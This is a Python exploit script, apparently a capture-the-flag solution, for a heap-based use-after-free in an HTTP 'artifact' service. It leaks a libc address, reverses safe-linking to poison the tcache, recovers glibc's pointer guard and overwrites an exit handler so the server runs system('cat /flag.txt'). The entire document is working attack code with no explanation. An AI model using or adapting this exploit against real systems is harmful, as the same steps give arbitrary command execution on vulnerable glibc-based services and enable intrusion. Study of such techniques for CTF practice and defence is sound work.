import socket,struct,sys
H=sys.argv[1]; P=int(sys.argv[2])
LIBC_UNSORTED=0x203b20; EXIT_INITIAL=0x204fc0; SYSTEM=0x58750; LOADER_REL=0x21e000; DL_FINI=0x5380
class C:
 def __init__(self): self.s=socket.create_connection((H,P),5); self.s.settimeout(12); self.buf=b''
 def req(self,m,p,b=b''):
  raw=(f'{m} {p} HTTP/1.1\r\nHost: {H}:{P}\r\nUser-Agent: curl/8.5.0\r\nAccept: */*\r\nContent-Length: {len(b)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n').encode()+b
  self.s.sendall(raw)
  while b'\r\n\r\n' not in self.buf:
   x=self.s.recv(4096)
   if not x: raise ConnectionError()
   self.buf+=x
  head,self.buf=self.buf.split(b'\r\n\r\n',1); n=0
  for l in head.split(b'\r\n'):
   if l.lower().startswith(b'content-length:'): n=int(l.split(b':',1)[1])
  while len(self.buf)<n:
   x=self.s.recv(4096)
   if not x: raise ConnectionError()
   self.buf+=x
  body,self.buf=self.buf[:n],self.buf[n:]; print(m,p,len(body),file=sys.stderr); return body
 def finish(self):
  self.s.shutdown(socket.SHUT_WR); self.s.settimeout(6); o=self.buf; self.buf=b''
  try:
   while True:
    x=self.s.recv(4096)
    if not x: break
    o+=x
  except socket.timeout: pass
  return o
def q(b,o=0): return struct.unpack_from('<Q',b,o)[0]
def inv(v):
 x=v
 for _ in range(8): x=v^(x>>12)
 return x
c=C()
c.req('POST','/api/artifact/add?id=10&size=1280',b'A'*8); c.req('POST','/api/artifact/add?id=11&size=1280',b'B'*8); c.req('POST','/api/artifact/del?id=10')
libc=q(c.req('GET','/api/artifact/view?id=10'))-LIBC_UNSORTED; target=libc+EXIT_INITIAL
c.req('POST','/api/artifact/add?id=0&size=96',b'A'*8); c.req('POST','/api/artifact/add?id=1&size=96',b'B'*8); c.req('POST','/api/artifact/del?id=0'); c.req('POST','/api/artifact/del?id=1')
e=q(c.req('GET','/api/artifact/view?id=1')); a=inv(e); b=a+0x70
c.req('POST','/api/artifact/edit?id=1',struct.pack('<Q',(b>>12)^target)); c.req('POST','/api/artifact/add?id=2&size=96'); c.req('POST','/api/artifact/add?id=3&size=96')
mangled=q(c.req('GET','/api/artifact/view?id=3'),0x18); loader=libc+LOADER_REL; fn=loader+DL_FINI; ror=((mangled>>17)|(mangled<<(64-17)))&((1<<64)-1); guard=ror^fn
print(f'libc={libc:#x} loader={loader:#x} guard={guard:#x}',file=sys.stderr)
x=(libc+SYSTEM)^guard; mangled_sys=((x<<17)|(x>>(64-17)))&((1<<64)-1)
fake=bytearray(96); struct.pack_into('<Q',fake,0,0); struct.pack_into('<Q',fake,8,1); struct.pack_into('<I',fake,16,4); struct.pack_into('<Q',fake,24,mangled_sys); struct.pack_into('<Q',fake,32,target+0x30); struct.pack_into('<Q',fake,40,0); fake[48:64]=b'cat /flag.txt\x00'
c.req('POST','/api/artifact/edit?id=3',bytes(fake)); print(c.finish().decode('utf-8','replace'))

